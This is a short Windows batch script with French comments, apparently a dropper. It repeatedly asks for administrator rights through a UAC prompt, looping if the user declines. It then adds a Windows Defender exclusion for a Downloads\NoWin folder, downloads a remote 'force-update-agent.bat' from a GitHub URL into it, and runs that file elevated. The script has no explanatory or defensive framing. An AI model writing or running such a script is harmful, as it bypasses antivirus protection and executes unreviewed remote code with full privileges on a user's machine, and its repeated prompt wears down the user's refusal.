@echo off
setlocal

:check_admin
:: Vérifie si le script a les droits admin
net session >nul 2>&1
if %errorLevel% == 0 (
    goto :run_payload
) else (
    echo Demande de privileges administrateur...
    :: Utilise PowerShell pour relancer le fichier BAT en mode administrateur
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    
    :: Si l'utilisateur clique sur "Non", le code suivant s'exécute et boucle
    if %errorLevel% neq 0 (
        goto :check_admin
    )
    exit /b
)

:run_payload
:: Exécution de ta commande PowerShell spécifique
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
"$p=\"$env:USERPROFILE\Downloads\NoWin\"; ^
New-Item -ItemType Directory -Path $p -Force|Out-Null; ^
Add-MpPreference -ExclusionPath $p -ErrorAction SilentlyContinue; ^
Invoke-WebRequest -UseBasicParsing -Uri 'https://raw.githubusercontent.com/LightZirconite/NoWin/main/force-update-agent.bat' -OutFile \"$p\force-update-agent.bat\"; ^
Start-Process \"$p\force-update-agent.bat\" -ArgumentList '--yes' -Verb RunAs"

exit /b
